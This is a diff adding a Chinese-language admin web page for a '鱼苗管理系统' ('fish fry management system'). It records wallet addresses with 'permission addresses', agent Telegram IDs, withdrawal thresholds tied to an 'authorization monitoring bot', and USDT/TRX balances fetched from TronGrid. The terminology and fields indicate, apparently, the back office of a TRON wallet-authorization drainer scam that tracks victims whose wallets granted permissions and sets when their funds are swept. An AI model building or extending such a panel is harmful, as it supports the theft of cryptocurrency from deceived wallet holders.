@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>鱼苗管理系统</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
+    <style>
+        body {
+            background-color: #f8f9fa;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+        .card {
+            border-radius: 15px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            margin-bottom: 20px;
+        }
+        .card-header {
+            background-color: #fff;
+            border-bottom: 1px solid rgba(0,0,0,.125);
+            border-radius: 15px 15px 0 0 !important;
+        }
+        .form-control, .form-select {
+            border-radius: 8px;
+        }
+        .btn {
+            border-radius: 8px;
+            padding: 8px 16px;
+        }
+        .table th {
+            background-color: #f8f9fa;
+            font-weight: 600;
+        }
+        .balance-card {
+            transition: transform 0.2s;
+        }
+        .balance-card:hover {
+            transform: translateY(-5px);
+        }
+        .address-cell {
+            max-width: 200px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            cursor: pointer;
+        }
+        .editable {
+            cursor: pointer;
+            padding: 5px;
+            border-radius: 4px;
+            transition: background-color 0.2s;
+        }
+        .editable:hover {
+            background-color: #f0f0f0;
+        }
+        .editing {
+            padding: 0 !important;
+        }
+        .editing input {
+            width: 100%;
+            padding: 5px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            margin: 0;
+        }
+        .tooltip-inner {
+            max-width: none;
+            padding: 5px 10px;
+        }
+        .search-highlight {
+            background-color: #fff3cd;
+            padding: 2px;
+            border-radius: 2px;
+        }
+        .loading {
+            opacity: 0.6;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+<div class="container py-4">
+
+    <div class="row mb-4">
+        <div class="col-md-3">
+            <div class="card balance-card bg-primary text-white">
+                <div class="card-body">
+                    <h6 class="card-title">总USDT余额</h6>
+                    <h3 class="card-text">{$totalUSDT|default='0.00'} USDT</h3>
+                </div>
+            </div>
+        </div>
+        <div class="col-md-3">
+            <div class="card balance-card bg-success text-white">
+                <div class="card-body">
+                    <h6 class="card-title">总TRX余额</h6>
+                    <h3 class="card-text">{$totalTRX|default='0.00'} TRX</h3>
+                </div>
+            </div>
+        </div>
+        <div class="col-md-3">
+            <div class="card balance-card bg-info text-white">
+                <div class="card-body">
+                    <h6 class="card-title">鱼苗总数</h6>
+                    <h3 class="card-text">{$totalFish|default='0'}</h3>
+                </div>
+            </div>
+        </div>
+        <div class="col-md-3">
+            <div class="card balance-card bg-warning text-white">
+                <div class="card-body">
+                    <h6 class="card-title">今日新增</h6>
+                    <h3 class="card-text">{$todayNew|default='0'}</h3>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="card">
+        <div class="card-header">
+            <h5 class="mb-0">新增鱼苗</h5>
+        </div>
+        <div class="card-body">
+            <form id="addFishForm" class="row g-3" action="/admin/fish/add" method="post">
+                <div class="col-md-6">
+                    <label class="form-label">鱼苗地址</label>
+                    <input type="text" class="form-control" name="fish_address" required>
+                </div>
+                <div class="col-md-6">
+                    <label class="form-label">权限地址</label>
+                    <input type="text" class="form-control" name="permissions_fishaddress" required>
+                </div>
+                <div class="col-md-4">
+                    <label class="form-label">代理电报ID</label>
+                    <input type="text" class="form-control" name="tguid">
+                </div>
+				<div class="col-md-4">
+					<label class="form-label">提币阈值</label>
+					<input type="number" step="0.000001" class="form-control" name="threshold" placeholder="授权监听机器人 @bkcbot">
+				</div>
+                <div class="col-md-4">
+                    <label class="form-label">授权时间</label>
+                    <input type="datetime-local" class="form-control" name="time">
+                </div>
+                <div class="col-12">
+                    <label class="form-label">鱼苗备注</label>
+                    <input type="text" class="form-control" name="remark">
+                </div>
+                <div class="col-12">
+                    <button type="submit" class="btn btn-primary" id="saveBtn">
+                        <i class="fas fa-save"></i> 保存鱼苗信息
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+
+    <div class="card">
+        <div class="card-header d-flex justify-content-between align-items-center">
+            <h5 class="mb-0">鱼苗列表</h5>
+            <div>
+                <input type="text" class="form-control form-control-sm d-inline-block w-auto" id="searchInput" placeholder="搜索...">
+            </div>
+        </div>
+        <div class="card-body">
+            <div class="table-responsive">
+                <table class="table table-hover">
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>鱼苗地址</th>
+                            <th>权限地址</th>
+                            <th>代理ID</th>
+                            <th>授权时间</th>
+                            <th>提币阈值</th>
+                            <th>鱼苗备注</th>
+                            <th>USDT余额</th>
+                            <th>TRX余额</th>
+                            <th>操作</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                    {volist name="fishData" id="fish"}
+                        <tr data-id="{$fish.id}">
+                            <td>{$fish.id}</td>
+                            <td class="address-cell editable" data-field="fish_address" ondblclick="makeEditable(this)" title="{$fish.fish_address}">{$fish.fish_address}</td>
+                            <td class="address-cell editable" data-field="permissions_fishaddress" ondblclick="makeEditable(this)" title="{$fish.permissions_fishaddress}">{$fish.permissions_fishaddress}</td>
+                            <td class="editable" data-field="tguid" ondblclick="makeEditable(this)">{$fish.tguid}</td>
+                            <td class="editable" data-field="time" ondblclick="makeEditable(this)">{:date('Y-m-d H:i', strtotime($fish.time))}</td>
+                            <td class="editable" data-field="threshold" ondblclick="makeEditable(this)">{$fish.threshold}</td>
+                            <td class="editable" data-field="remark" ondblclick="makeEditable(this)">{$fish.remark}</td>
+                            <td id="usdt_balance_{$fish.id}">{$fish.usdt_balance} USDT</td>
+                            <td id="trx_balance_{$fish.id}">{$fish.trx_balance} TRX</td>
+                            <td>
+                                <button type="button" class="btn btn-sm btn-primary" onclick="refreshBalance('{$fish.fish_address}', {$fish.id})">
+                                    <i class="fas fa-sync-alt"></i>
+                                </button>
+                                <button type="button" class="btn btn-sm btn-danger" onclick="deleteFish({$fish.id})">
+                                    <i class="fas fa-trash"></i>
+                                </button>
+                            </td>
+                        </tr>
+                    {/volist}
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.4.0/axios.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+<script>
+
+let isSubmitting = false;
+
+// 显示成功消息
+function showSuccess(message) {
+    Swal.fire({
+        icon: 'success',
+        title: message,
+        showConfirmButton: false,
+        timer: 1500
+    });
+}
+
+// 显示错误消息
+function showError(message) {
+    Swal.fire({
+        icon: 'error',
+        title: '错误',
+        text: message
+    });
+}
+
+// 表单提交处理
+document.getElementById('addFishForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    if (isSubmitting) return;
+    
+    const saveBtn = document.getElementById('saveBtn');
+    const originalText = saveBtn.innerHTML;
+    
+    isSubmitting = true;
+    saveBtn.disabled = true;
+    saveBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> 保存中...';
+    
+    const formData = new FormData(this);
+    
+    if (!formData.get('time')) {
+        const now = new Date();
+        formData.set('time', now.toISOString().slice(0, 19).replace('T', ' '));
+    }
+    
+    axios.post('/admin/fish/add', Object.fromEntries(formData))
+        .then(response => {
+            if (response.data.code === 1) {
+                showSuccess(response.data.msg || '添加成功');
+                this.reset();
+                setTimeout(() => window.location.reload(), 1500);
+            } else {
+                throw new Error(response.data.msg || '添加失败');
+            }
+        })
+        .catch(error => {
+            showError(error.response?.data?.msg || error.message);
+        })
+        .finally(() => {
+            isSubmitting = false;
+            saveBtn.disabled = false;
+            saveBtn.innerHTML = originalText;
+        });
+});
+
+// 单元格编辑功能
+function makeEditable(element) {
+    if (element.classList.contains('editing')) return;
+    
+    const originalValue = element.textContent;
+    const field = element.dataset.field;
+    const id = element.parentNode.dataset.id;
+    
+    element.classList.add('editing');
+    
+    let input = document.createElement('input');
+    input.type = field === 'time' ? 'datetime-local' : 'text';
+    input.value = originalValue;
+    input.classList.add('form-control', 'form-control-sm');
+    
+    function save() {
+        const newValue = input.value;
+        
+        axios.post('/admin/fish/update', {
+            id: id,
+            field: field,
+            value: newValue
+        })
+        .then(response => {
+            if (response.data.code === 1) {
+                element.textContent = newValue;
+                element.title = newValue;
+                showSuccess('更新成功');
+            } else {
+                throw new Error(response.data.msg || '更新失败');
+            }
+        })
+        .catch(error => {
+            element.textContent = originalValue;
+            element.title = originalValue;
+            showError(error.response?.data?.msg || error.message);
+        })
+        .finally(() => {
+            element.classList.remove('editing');
+        });
+    }
+    
+    input.addEventListener('blur', save);
+    input.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            save();
+        }
+    });
+    
+    element.textContent = '';
+    element.appendChild(input);
+    input.focus();
+}
+
+// 删除鱼苗
+function deleteFish(id) {
+    Swal.fire({
+        title: '确认删除',
+        text: '此操作不可恢复！',
+        icon: 'warning',
+        showCancelButton: true,
+        confirmButtonColor: '#d33',
+        cancelButtonColor: '#3085d6',
+        confirmButtonText: '确定删除',
+        cancelButtonText: '取消'
+    }).then((result) => {
+        if (result.isConfirmed) {
+            axios.post('/admin/fish/del', { id: id })
+                .then(response => {
+                    if (response.data.code === 1) {
+                        showSuccess('删除成功');
+                        setTimeout(() => window.location.reload(), 1500);
+                    } else {
+                        throw new Error(response.data.msg || '删除失败');
+                    }
+                })
+                .catch(error => showError(error.response?.data?.msg || error.message));
+        }
+    });
+}
+
+// 刷新余额
+async function refreshBalance(address, id) {
+    const row = document.querySelector(`tr[data-id="${id}"]`);
+    row.classList.add('loading');
+    try {
+        const response = await axios.get(`https://api.trongrid.io/v1/accounts/${address}`);
+        const data = response.data;
+
+        if (!data.data || !data.data[0]) {
+            throw new Error('无效的接口响应');
+        }
+
+        // 提取账户信息
+        const account = data.data[0];
+
+        // TRX余额
+        const trxBalance = account.balance
+            ? (parseFloat(account.balance) / 1000000).toFixed(6)
+            : '0.000000';
+
+        //算USDT余额
+        const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+        let usdtBalance = '0.000000';
+        if (account.trc20 && Array.isArray(account.trc20)) {
+            const usdtData = account.trc20.find(token => token[USDT_CONTRACT]);
+            if (usdtData) {
+                usdtBalance = (parseFloat(usdtData[USDT_CONTRACT]) / 1000000).toFixed(6);
+            }
+        }
+
+        // 更新数据库
+        const updateResponse = await axios.post('/admin/fish/balance', {
+            id: id,
+            usdt_balance: usdtBalance,
+            trx_balance: trxBalance
+        });
+
+        if (updateResponse.data.code === 1) {
+            document.getElementById(`usdt_balance_${id}`).textContent = `${usdtBalance} USDT`;
+            document.getElementById(`trx_balance_${id}`).textContent = `${trxBalance} TRX`;
+            showSuccess('余额更新成功');
+        } else {
+            throw new Error(updateResponse.data.msg || '更新失败');
+        }
+    } catch (error) {
+        showError('查询失败：' + (error.response?.data?.msg || error.message));
+    } finally {
+        row.classList.remove('loading');
+    }
+}
+
+
+// 搜索功能
+document.getElementById('searchInput').addEventListener('input', function(e) {
+    const searchText = e.target.value.toLowerCase().trim();
+    const rows = document.querySelectorAll('tbody tr');
+    
+    rows.forEach(row => {
+        const cells = row.querySelectorAll('td');
+        const searchContent = Array.from(cells)
+            .map(cell => cell.textContent.trim())
+            .join(' ')
+            .toLowerCase();
+            
+        const isMatch = !searchText || searchContent.includes(searchText);
+        row.style.display = isMatch ? '' : 'none';
+        
+        if (isMatch && searchText) {
+            Array.from(cells).forEach(cell => {
+                const text = cell.textContent;
+                if (text.toLowerCase().includes(searchText)) {
+                    cell.innerHTML = text.replace(
+                        new RegExp(searchText, 'gi'),
+                        match => `<span class="bg-warning">${match}</span>`
+                    );
+                }
+            });
+        } else {
+            Array.from(cells).forEach(cell => {
+
+                if (cell.classList.contains('address-cell')) {
+                    const title = cell.getAttribute('title');
+                    cell.textContent = title || cell.textContent;
+                } else {
+                    cell.textContent = cell.textContent;
+                }
+            });
+        }
+    });
+});
+
+
+document.addEventListener('DOMContentLoaded', function() {
+    const addressCells = document.querySelectorAll('.address-cell');
+    addressCells.forEach(cell => {
+        new bootstrap.Tooltip(cell);
+    });
+});
+</script>
+</body>
+</html>
